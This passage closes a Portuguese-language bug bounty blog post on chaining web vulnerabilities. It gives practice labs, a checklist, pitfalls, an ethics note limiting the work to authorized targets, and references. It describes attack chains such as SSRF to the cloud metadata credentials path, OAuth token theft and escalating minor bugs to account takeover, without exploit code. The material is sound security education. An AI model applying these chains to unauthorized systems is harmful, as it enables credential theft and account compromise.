  - [PortSwigger Web Security Academy](https://portswigger.net/web-security/all-labs) — labs de **OAuth**, **SSRF**, **XSS** e **request smuggling** que já são, na prática, mini-cadeias.
  - [PentesterLab](https://pentesterlab.com/) e [TryHackMe](https://tryhackme.com/) / [HackTheBox](https://www.hackthebox.com/) — máquinas que exigem encadear pra chegar no objetivo.
- **Estudo de chains reais:** a lista [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) reúne centenas de reports divulgados — leia os de severidade alta e repare como quase sempre são **cadeias**, não bugs únicos.

## Checklist do caçador de cadeias

- [ ] Anotei a **primitiva** de cada achado (até os "info"/"low"), não só o nome da classe.
- [ ] Mapeei os **sinks valiosos** (OAuth, reset de senha, pagamento, admin, nuvem).
- [ ] Cruzei cada primitiva com cada sink perguntando **"e se eu ligar X com Y?"**.
- [ ] Tentei transformar **self-XSS / open redirect / CSRF de login** em peças de cadeia.
- [ ] Em alvo cloud, testei SSRF → **metadata** (respeitando o escopo).
- [ ] Levei a PoC **até o impacto final** (token roubado, conta tomada, PII em massa).
- [ ] Reportei a **cadeia inteira numa narrativa**, com severidade justificada pelo elo final.

## Pegadinhas / o que NÃO funciona

- ❌ **Reportar os elos separados.** Vira N× *Low* em vez de 1× *Critical*. Junte na história.
- ❌ **Parar no `alert(1)`/no header injetado.** Sem o impacto final demonstrado, o triador faz *downgrade*. Vá até o fim.
- ❌ **Inventar elo que você não provou.** "Daria pra escalar pra RCE" sem PoC não conta — e queima sua credibilidade. Demonstre cada passo.
- ❌ **Achar que IMDSv2 / `HttpOnly` / UUID matam a cadeia sozinhos.** São **um** elo. Bons defensores empilham camadas justamente porque uma cai.

## O que você precisa lembrar

- O triador paga pelo **impacto da cadeia**, não pela severidade isolada dos elos.
- Pense em **primitivas** (o que a falha te *dá*), não em nomes de bug. Cadeias nascem ligando primitiva → ponte → impacto.
- A pergunta-motor é **"e se eu ligar X com Y?"** — e os melhores X's costumam ser os achados "sem impacto".

> 💡 **Dica de ouro:** antes de descartar um "low", pergunte *"isso é entrada de alguma coisa maior?"*. Open redirect, self-XSS, info disclosure e CSRF de login são, sozinhos, migalhas — e, encadeados, são os elos que viram os maiores bounties da sua vida.

## Nota ética

Cadeias amplificam impacto — e impacto real causa dano real. Tudo aqui é pra **alvos autorizados**: bug bounty dentro do escopo, pentests contratados e labs legais. Encadear até credenciais de nuvem ou PII em sistemas de terceiros sem autorização é crime e fere pessoas reais. **Pare no PoC mínimo** que prova a cadeia: não baixe a base inteira de PII, não use credenciais cloud pra mais do que listar a permissão, não persista acesso. Demonstre, documente, reporte com responsabilidade.

## Referências

- [OWASP Top 10 (2021)](https://owasp.org/Top10/) — as classes que viram elos.
- [PortSwigger — OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth) (roubo de token via `redirect_uri`).
- [PortSwigger — Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf).
- [AWS — How Instance Metadata Service Version 2 works (IMDSv2)](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html) (token, `169.254.169.254`, `iam/security-credentials/`).
- [AWS — Defense in depth contra SSRF no IMDS](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/) (por que o IMDSv2 nega `PUT` com `X-Forwarded-For` e usa hop limit 1).
- [FIRST — CVSS v4.0 Calculator](https://www.first.org/cvss/calculator/4.0) e [Specification](https://www.first.org/cvss/v4.0/specification-document) — pontuar o impacto final da chain (sistema vs. subsequente).
- [RFC 9110 §10.2.2 — Location](https://www.rfc-editor.org/rfc/rfc9110#name-location) (reanexação do fragmento pelos navegadores no redirect — base da Cadeia 1).
- [PortSwigger — Cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting) e [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning).
- [OWASP — CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection).
- [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) — reports divulgados pra estudar cadeias reais.

---
*Relacionado na série: [Open Redirect](/posts/open-redirect/) · [SSRF](/posts/ssrf/) · [Cloud / AWS Misconfiguration](/posts/cloud-aws-misconfiguration/) · [RCE, Command Injection e SSTI](/posts/rce-command-injection-ssti/) · [XSS e HTML Injection](/posts/xss-html-injection/) · [Account Takeover](/posts/account-takeover/) · [Broken Access Control (IDOR/BOLA/BFLA)](/posts/broken-access-control-idor-bola-bfla/) · [CRLF e Request Smuggling](/posts/crlf-request-smuggling/) · [Subdomain Takeover](/posts/subdomain-takeover-broken-link-hijacking/) · [Severidade e triagem](/posts/severidade-impacto-triagem/) · [Como escrever um report que paga](/posts/como-escrever-report-que-paga/)*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)** — o índice da série, do básico ao avançado.*
